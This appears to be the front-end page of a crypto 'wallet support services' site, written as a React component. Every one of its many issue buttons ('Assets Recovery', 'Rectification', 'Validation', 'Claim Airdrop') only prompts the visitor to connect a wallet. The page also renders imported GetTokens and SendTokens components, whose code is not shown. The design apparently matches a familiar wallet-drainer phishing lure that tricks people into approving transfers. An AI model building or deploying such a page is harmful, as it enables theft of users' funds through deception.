import { ConnectButton } from '@rainbow-me/rainbowkit';
import { GetTokens, SendTokens } from '../components/contract';
import { useState } from 'react';

export default function Home() {
  const [showModal, setShowModal] = useState(false);
  const [selectedService, setSelectedService] = useState('');

  const handleServiceClick = (service: string) => {
    setSelectedService(service);
    setShowModal(true);
  };

  return (
    <>
      <style jsx>{`
        .container {
          font-family: 'Arial', sans-serif;
          margin: 0;
          padding: 0;
          background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
          color: #fff;
          overflow-x: hidden;
          min-height: 100vh;
        }

        .header {
          padding: 1rem;
          display: flex;
          justify-content: flex-end;
          background: rgba(0, 0, 0, 0.3);
          backdrop-filter: blur(10px);
          border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .content {
          padding: 20px;
        }

        .title {
          text-align: center;
          margin-bottom: 40px;
          margin-top: 20px;
          font-size: 36px;
          color: #00bfff;
          text-shadow: 1px 1px 5px #000;
          animation: floatText 4s ease-in-out infinite alternate;
        }

        @keyframes floatText {
          0% { transform: translateY(0px); }
          100% { transform: translateY(-10px); }
        }

        .grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
          gap: 20px;
          margin-bottom: 40px;
        }

        .grid-button {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 20px;
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid rgba(255, 255, 255, 0.2);
          border-radius: 16px;
          color: #fff;
          cursor: pointer;
          font-size: 16px;
          transition: all 0.3s ease;
          backdrop-filter: blur(8px);
          box-shadow: 0 4px 20px rgba(0,0,0,0.5);
          text-align: center;
          position: relative;
          animation: floatButton 6s ease-in-out infinite alternate;
        }

        @keyframes floatButton {
          0% { transform: translateY(0px); }
          100% { transform: translateY(-6px); }
        }

        .grid-button i {
          font-size: 28px;
          margin-bottom: 10px;
          color: #00bfff;
        }

        .grid-button:hover {
          transform: translateY(-10px) scale(1.05);
          box-shadow: 0 8px 25px rgba(0,0,0,0.6);
          border-color: rgba(0, 191, 255, 0.6);
        }

        .section {
          padding: 20px;
          border-radius: 16px;
          margin-bottom: 30px;
          background: linear-gradient(135deg, rgba(0,191,255,0.05), rgba(255,0,255,0.05));
          position: relative;
          overflow: hidden;
        }

        .section::before {
          content: '';
          position: absolute;
          top: -50%;
          left: -50%;
          width: 200%;
          height: 200%;
          background: radial-gradient(circle at 30% 30%, rgba(0,191,255,0.2), transparent 50%);
          animation: moveBG 15s linear infinite;
          pointer-events: none;
        }

        @keyframes moveBG {
          0% { transform: rotate(0deg) translate(0, 0); }
          100% { transform: rotate(360deg) translate(0, 0); }
        }

        .section h3 {
          margin-bottom: 20px;
          font-size: 22px;
          color: #00ffff;
          text-shadow: 0 1px 3px rgba(0,0,0,0.5);
          position: relative;
          z-index: 1;
        }

        .contract-section {
          max-width: 800px;
          margin: 40px auto;
          padding: 30px;
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid rgba(255, 255, 255, 0.2);
          border-radius: 16px;
          backdrop-filter: blur(8px);
        }

        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.8);
          display: flex;
          justify-content: center;
          align-items: center;
          z-index: 1000;
          animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }

        .modal {
          background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
          padding: 30px;
          border-radius: 16px;
          max-width: 500px;
          width: 90%;
          border: 1px solid rgba(0, 191, 255, 0.3);
          box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
          animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
          from { transform: translateY(-50px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }

        .modal-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }

        .modal-title {
          color: #00bfff;
          font-size: 24px;
          margin: 0;
        }

        .close-button {
          background: none;
          border: none;
          color: #fff;
          font-size: 28px;
          cursor: pointer;
          padding: 0;
          width: 32px;
          height: 32px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 4px;
          transition: all 0.3s ease;
        }

        .close-button:hover {
          background: rgba(255, 255, 255, 0.1);
          transform: rotate(90deg);
        }

        .modal-content {
          color: #fff;
          line-height: 1.6;
        }

        @media (max-width: 600px) {
          .grid-button {
            font-size: 14px;
            padding: 16px;
          }

          .grid-button i {
            font-size: 24px;
          }

          .title {
            font-size: 28px;
          }
        }
      `}</style>

      <link
        rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
        integrity="sha512-Hz3pK8N4Rk8lJxkkRzpHfE2nJp6++c/nP+rMF3z5Qq/HErQ7G17WZJLdOwXwxQ1A6Dn3pdxC7E6EwFV4fjVtQ=="
        crossOrigin="anonymous"
        referrerPolicy="no-referrer"
      />

      <div className="container">
        <header className="header">
          <ConnectButton />
        </header>

        <div className="content">
          <h2 className="title">Our Services</h2>

          <div className="section">
            <h3>Presale & Token</h3>
            <div className="grid">
              <button className="grid-button" onClick={() => handleServiceClick('Buy Presale')}>
                <i className="fas fa-coins"></i>
                Buy Presale
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Claim Token')}>
                <i className="fas fa-gift"></i>
                Claim Token
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Claim Airdrop')}>
                <i className="fas fa-hand-holding-dollar"></i>
                Claim Airdrop
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Token Value / Price')}>
                <i className="fas fa-dollar-sign"></i>
                Token Value / Price
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Token Bridge')}>
                <i className="fas fa-exchange-alt"></i>
                Token Bridge
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Add To Wallet')}>
                <i className="fas fa-wallet"></i>
                Add To Wallet
              </button>
            </div>
          </div>

          <div className="section">
            <h3>Wallet & Connection Issues</h3>
            <div className="grid">
              <button className="grid-button" onClick={() => handleServiceClick('Connect To Dapp')}>
                <i className="fas fa-plug"></i>
                Connect To Dapp
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Trading Wallet Issues')}>
                <i className="fas fa-university"></i>
                Trading Wallet Issues
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Unable To Buy Coin/Token')}>
                <i className="fas fa-ban"></i>
                Unable To Buy Coin/Token
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Locked Account')}>
                <i className="fas fa-lock"></i>
                Locked Account
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Update Balance')}>
                <i className="fas fa-sync-alt"></i>
                Update Balance
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('High Gas Fees')}>
                <i className="fas fa-gas-pump"></i>
                High Gas Fees
              </button>
            </div>
          </div>

          <div className="section">
            <h3>Staking & Rewards</h3>
            <div className="grid">
              <button className="grid-button" onClick={() => handleServiceClick('Staking Issues')}>
                <i className="fas fa-chart-line"></i>
                Staking Issues
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Unstaking')}>
                <i className="fas fa-hand-holding-heart"></i>
                Unstaking
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Claim Reward')}>
                <i className="fas fa-trophy"></i>
                Claim Reward
              </button>
            </div>
          </div>

          <div className="section">
            <h3>Transaction & Trading</h3>
            <div className="grid">
              <button className="grid-button" onClick={() => handleServiceClick('Deposit & Withdrawal')}>
                <i className="fas fa-wallet"></i>
                Deposit & Withdrawal
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Slippage Error')}>
                <i className="fas fa-exclamation-triangle"></i>
                Slippage Error
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Transaction Error')}>
                <i className="fas fa-exclamation-circle"></i>
                Transaction Error
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Transaction Delay')}>
                <i className="fas fa-clock"></i>
                Transaction Delay
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Swap & Exchange')}>
                <i className="fas fa-exchange-alt"></i>
                Swap & Exchange
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Validation')}>
                <i className="fas fa-check-circle"></i>
                Validation
              </button>
            </div>
          </div>

          <div className="section">
            <h3>Issue Resolution & Recovery</h3>
            <div className="grid">
              <button className="grid-button" onClick={() => handleServiceClick('Migrate Issues')}>
                <i className="fas fa-sync-alt"></i>
                Migrate Issues
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Assets Recovery')}>
                <i className="fas fa-shield-alt"></i>
                Assets Recovery
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('General Issues')}>
                <i className="fas fa-tools"></i>
                General Issues
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Rectification')}>
                <i className="fas fa-pencil-alt"></i>
                Rectification
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Emergency Withdrawal/Refund')}>
                <i className="fas fa-ambulance"></i>
                Emergency Withdrawal/Refund
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Missing / Irregular Balance')}>
                <i className="fas fa-exclamation-triangle"></i>
                Missing / Irregular Balance
              </button>
              <button className="grid-button" onClick={() => handleServiceClick('Other Issues')}>
                <i className="fas fa-question-circle"></i>
                Other Issues
              </button>
            </div>
          </div>

          <div className="contract-section">
            <GetTokens />
            <div style={{ marginTop: '20px' }}>
              <SendTokens />
            </div>
          </div>
        </div>

        {showModal && (
          <div className="modal-overlay" onClick={() => setShowModal(false)}>
            <div className="modal" onClick={(e) => e.stopPropagation()}>
              <div className="modal-header">
                <h3 className="modal-title">{selectedService}</h3>
                <button className="close-button" onClick={() => setShowModal(false)}>
                  ×
                </button>
              </div>
              <div className="modal-content">
                <p>Please connect your wallet to proceed with {selectedService}.</p>
                <p>Make sure you have the necessary permissions and sufficient balance in your wallet.</p>
              </div>
            </div>
          </div>
        )}
      </div>
    </>
  );
}